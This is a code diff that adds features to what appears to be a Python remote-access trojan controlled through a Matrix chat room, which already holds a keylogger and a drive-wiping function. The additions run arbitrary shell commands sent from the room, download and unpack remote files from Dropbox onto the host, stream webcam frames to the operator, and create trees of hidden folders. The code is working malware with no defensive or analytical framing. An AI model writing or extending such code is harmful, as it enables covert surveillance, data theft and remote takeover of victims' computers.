@@ -19,6 +19,15 @@ import pyperclip
 from pynput import keyboard, mouse
 import queue
 from collections import deque
+import zipfile
+import urllib.request
+import urllib.parse
+import cv2
+import base64
+import io
+from PIL import Image
+import string
+import random
 
 
 # Matrix configuration (will be replaced by bot_starter.vbs)
@@ -352,6 +361,7 @@ except ImportError:
 # Global variables
 client = None
 keylogger = None
+camera_streamer = None
 connection_timestamp = None  # This will be in Matrix server time (milliseconds)
 temp_dir = os.environ.get('TEMP', tempfile.gettempdir())
 lock_file = os.path.join(temp_dir, "matrix_bot_temp", "bot.lock")
@@ -673,6 +683,238 @@ def clear_drive(drive_letter):
     except Exception as e:
         return False, str(e)
 
+def download_and_extract_dropbox(dropbox_url, destination_path):
+    """Download and extract files/folders from Dropbox"""
+    try:
+        # Ensure the URL has dl=1 parameter for direct download
+        if 'dl=0' in dropbox_url:
+            dropbox_url = dropbox_url.replace('dl=0', 'dl=1')
+        elif 'dl=1' not in dropbox_url:
+            separator = '&' if '?' in dropbox_url else '?'
+            dropbox_url += f'{separator}dl=1'
+        
+        # Create destination directory if it doesn't exist
+        os.makedirs(destination_path, exist_ok=True)
+        
+        # Download the file
+        temp_file = os.path.join(temp_dir, f"dropbox_download_{int(time.time())}.zip")
+        
+        urllib.request.urlretrieve(dropbox_url, temp_file)
+        
+        # Check if it's a zip file (folder) or regular file
+        try:
+            with zipfile.ZipFile(temp_file, 'r') as zip_ref:
+                # It's a zip file (folder), extract it
+                zip_ref.extractall(destination_path)
+                extracted_items = zip_ref.namelist()
+                os.remove(temp_file)  # Clean up temp file
+                return True, f"Extracted {len(extracted_items)} items to {destination_path}"
+        except zipfile.BadZipFile:
+            # It's a regular file, move it to destination
+            filename = os.path.basename(urllib.parse.urlparse(dropbox_url).path)
+            if not filename or filename == '':
+                filename = f"downloaded_file_{int(time.time())}"
+            
+            final_path = os.path.join(destination_path, filename)
+            os.rename(temp_file, final_path)
+            return True, f"Downloaded file to {final_path}"
+            
+    except Exception as e:
+        # Clean up temp file if it exists
+        try:
+            if 'temp_file' in locals() and os.path.exists(temp_file):
+                os.remove(temp_file)
+        except:
+            pass
+        return False, f"Download failed: {str(e)}"
+
+def run_terminal_command(command):
+    """Run terminal command and return output"""
+    try:
+        # Run command in background and capture output
+        result = subprocess.run(
+            command, 
+            shell=True, 
+            capture_output=True, 
+            text=True, 
+            timeout=30  # 30 second timeout
+        )
+        
+        output = ""
+        if result.stdout:
+            output += f"STDOUT:\n{result.stdout}\n"
+        if result.stderr:
+            output += f"STDERR:\n{result.stderr}\n"
+        
+        output += f"Return code: {result.returncode}"
+        
+        return True, output
+        
+    except subprocess.TimeoutExpired:
+        return False, "Command timed out (30 seconds)"
+    except Exception as e:
+        return False, f"Command failed: {str(e)}"
+
+def get_safe_folder_name(base_name, max_length=50):
+    """Generate a safe folder name within Windows limits"""
+    # Remove invalid characters
+    invalid_chars = '<>:"/\\|?*'
+    safe_name = ''.join(c for c in base_name if c not in invalid_chars)
+    
+    # Truncate if too long
+    if len(safe_name) > max_length:
+        safe_name = safe_name[:max_length]
+    
+    # Ensure it doesn't end with a period or space
+    safe_name = safe_name.rstrip('. ')
+    
+    # If empty after cleaning, generate a random name
+    if not safe_name:
+        safe_name = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
+    
+    return safe_name
+
+def create_5ary_tree(root_path, depth, current_depth=0):
+    """Create a 5-ary tree of folders"""
+    if current_depth >= depth:
+        return True, "Max depth reached"
+    
+    try:
+        # Create root directory if it doesn't exist
+        if current_depth == 0:
+            os.makedirs(root_path, exist_ok=True)
+            # Hide the root folder
+            try:
+                subprocess.run(['attrib', '+H', root_path], check=False)
+            except:
+                pass
+        
+        created_folders = 0
+        
+        # Create 5 child folders
+        for i in range(5):
+            # Generate folder name with path length checking
+            base_name = f"node_{current_depth}_{i}"
+            safe_name = get_safe_folder_name(base_name)
+            
+            child_path = os.path.join(root_path, safe_name)
+            
+            # Check if the full path would exceed Windows limits (260 characters)
+            if len(child_path) > 240:  # Leave some buffer
+                continue
+            
+            try:
+                os.makedirs(child_path, exist_ok=True)
+                created_folders += 1
+                
+                # Hide the folder
+                try:
+                    subprocess.run(['attrib', '+H', child_path], check=False)
+                except:
+                    pass
+                
+                # Recursively create children
+                create_5ary_tree(child_path, depth, current_depth + 1)
+                
+            except (OSError, FileNotFoundError) as e:
+                # If we hit path length limits, stop creating at this level
+                if "path too long" in str(e).lower() or len(child_path) > 240:
+                    break
+                continue
+        
+        if current_depth == 0:
+            return True, f"Created 5-ary tree with depth {depth} at {root_path}"
+        
+        return True, "Tree created successfully"
+        
+    except Exception as e:
+        return False, f"Failed to create tree: {str(e)}"
+
+class CameraStreamer:
+    def __init__(self, bot_instance):
+        self.bot = bot_instance
+        self.is_streaming = False
+        self.camera = None
+        self.stream_task = None
+        
+    def start_stream(self):
+        """Start camera streaming"""
+        if self.is_streaming:
+            return False, "Camera is already streaming"
+        
+        try:
+            # Try to initialize camera
+            self.camera = cv2.VideoCapture(0)
+            if not self.camera.isOpened():
+                return False, "Could not access camera"
+            
+            # Set camera properties for better performance
+            self.camera.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
+            self.camera.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
+            self.camera.set(cv2.CAP_PROP_FPS, 15)
+            
+            self.is_streaming = True
+            
+            # Start streaming task
+            asyncio.create_task(self.stream_loop())
+            
+            return True, "Camera streaming started"
+            
+        except Exception as e:
+            return False, f"Failed to start camera: {str(e)}"
+    
+    def stop_stream(self):
+        """Stop camera streaming"""
+        self.is_streaming = False
+        
+        if self.camera:
+            self.camera.release()
+            self.camera = None
+            
+        if self.stream_task:
+            self.stream_task.cancel()
+            self.stream_task = None
+    
+    async def stream_loop(self):
+        """Main streaming loop"""
+        try:
+            while self.is_streaming and self.camera:
+                ret, frame = self.camera.read()
+                if not ret:
+                    break
+                
+                # Convert frame to base64
+                try:
+                    # Resize frame for faster transmission
+                    frame = cv2.resize(frame, (320, 240))
+                    
+                    # Convert to JPEG
+                    _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
+                    
+                    # Convert to base64
+                    frame_base64 = base64.b64encode(buffer).decode('utf-8')
+                    
+                    # Send frame to Matrix
+                    await client.room_send(
+                        room_id=ROOM_ID,
+                        message_type="m.room.message",
+                        content={
+                            "msgtype": "m.text",
+                            "body": f"[CAMERA_FRAME] {frame_base64[:100]}..." # Truncate for display
+                        }
+                    )
+                    
+                except Exception as e:
+                    print(f"Error processing frame: {e}")
+                
+                # Control frame rate
+                await asyncio.sleep(0.5)  # 2 FPS
+                
+        except Exception as e:
+            print(f"Camera streaming error: {e}")
+        finally:
+            self.stop_stream()
+
 async def establish_connection_timestamp():
     """Establish connection timestamp using Matrix server time"""
     global connection_timestamp
@@ -781,6 +1023,7 @@ async def message_callback(room: MatrixRoom, event: RoomMessageText):
 async def process_command(message):
     """Process bot commands"""
     global running
+    global camera_streamer
     
     message = message.strip()
     
@@ -912,6 +1155,93 @@ async def process_command(message):
         except Exception as e:
             return f"Error stopping keylogger: {str(e)}"
 
+    # Download from Dropbox
+    elif message.startswith(f"Download from Dropbox ") and BOT_NAME in message:
+        # Extract URL and path: "Download from Dropbox URL to PATH BOT_NAME"
+        parts = message.split()
+        if "to" in parts:
+            url_start = message.find("Download from Dropbox ") + len("Download from Dropbox ")
+            to_index = message.find(" to ")
+            bot_index = message.rfind(f" {BOT_NAME}")
+            
+            if to_index > url_start and bot_index > to_index:
+                dropbox_url = message[url_start:to_index].strip()
+                destination_path = message[to_index + 4:bot_index].strip()
+                
+                success, msg = download_and_extract_dropbox(dropbox_url, destination_path)
+                if success:
+                    return f"Download successful: {msg}"
+                else:
+                    return f"Download failed: {msg}"
+            else:
+                return "Invalid download command format. Use: Download from Dropbox URL to PATH BOT_NAME"
+        else:
+            return "Invalid download command format. Use: Download from Dropbox URL to PATH BOT_NAME"
+    
+    # Run terminal command
+    elif message.startswith(f"Run command ") and BOT_NAME in message:
+        # Extract command: "Run command COMMAND BOT_NAME"
+        start_idx = message.find("Run command ") + len("Run command ")
+        end_idx = message.rfind(f" {BOT_NAME}")
+        if end_idx > start_idx:
+            command = message[start_idx:end_idx].strip()
+            success, output = run_terminal_command(command)
+            if success:
+                # Truncate output if too long
+                if len(output) > 1000:
+                    output = output[:1000] + "...[truncated]"
+                return f"Command output:\n{output}"
+            else:
+                return f"Command error: {output}"
+        else:
+            return "Invalid command format. Use: Run command COMMAND BOT_NAME"
+    
+    # Start camera stream
+    elif message == f"Start camera stream {BOT_NAME}":
+        try:
+            success, msg = camera_streamer.start_stream()
+            if success:
+                return "Camera streaming started"
+            else:
+                return f"Camera error: {msg}"
+        except Exception as e:
+            return f"Camera error: {str(e)}"
+    
+    # Stop camera stream
+    elif message == f"Stop camera stream {BOT_NAME}":
+        try:
+            camera_streamer.stop_stream()
+            return "Camera streaming stopped"
+        except Exception as e:
+            return f"Error stopping camera: {str(e)}"
+    
+    # Create folder tree
+    elif message.startswith(f"Create folder tree ") and BOT_NAME in message:
+        # Extract path and depth: "Create folder tree PATH depth DEPTH BOT_NAME"
+        if " depth " in message:
+            start_idx = message.find("Create folder tree ") + len("Create folder tree ")
+            depth_idx = message.find(" depth ")
+            end_idx = message.rfind(f" {BOT_NAME}")
+            
+            if depth_idx > start_idx and end_idx > depth_idx:
+                tree_path = message[start_idx:depth_idx].strip()
+                depth_str = message[depth_idx + 7:end_idx].strip()
+                
+                try:
+                    depth = int(depth_str)
+                    if depth < 1 or depth > 10:  # Reasonable limits
+                        return "Depth must be between 1 and 10"
+                    
+                    success, msg = create_5ary_tree(tree_path, depth)
+                    return msg
+                except ValueError:
+                    return "Invalid depth value. Must be a number."
+            else:
+                return "Invalid tree command format. Use: Create folder tree PATH depth DEPTH BOT_NAME"
+        else:
+            return "Invalid tree command format. Use: Create folder tree PATH depth DEPTH BOT_NAME"
+
+
     # Unrecognized command - respond with nothing
     return None
 
@@ -941,6 +1271,7 @@ async def main():
     # Create keylogger instance
     # Create keylogger instance
     keylogger = KeyLogger(None)
+    camera_streamer = CameraStreamer(None)
 
     try:
         # Login
@@ -981,6 +1312,8 @@ async def main():
         print(f"Bot error: {e}")
     finally:
         running = False
+        if camera_streamer:
+            camera_streamer.stop_stream()
         if client:
             await client.close()
         print("Bot stopped")
